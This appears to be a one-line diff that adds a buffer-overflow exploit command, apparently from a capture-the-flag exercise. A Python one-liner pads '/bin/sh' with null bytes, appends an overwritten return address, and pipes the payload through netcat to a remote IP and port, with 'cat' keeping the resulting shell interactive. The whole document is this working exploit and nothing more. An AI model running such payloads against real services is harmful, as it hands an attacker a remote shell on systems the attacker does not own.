@@ -1,0 +1,1 @@
+(python -c "print ('/bin/sh'.ljust(0x128, '\x00')+'\xed\x00\x40').ljust(0x142-1, '\x00')"; cat) | nc 159.65.125.233 6009
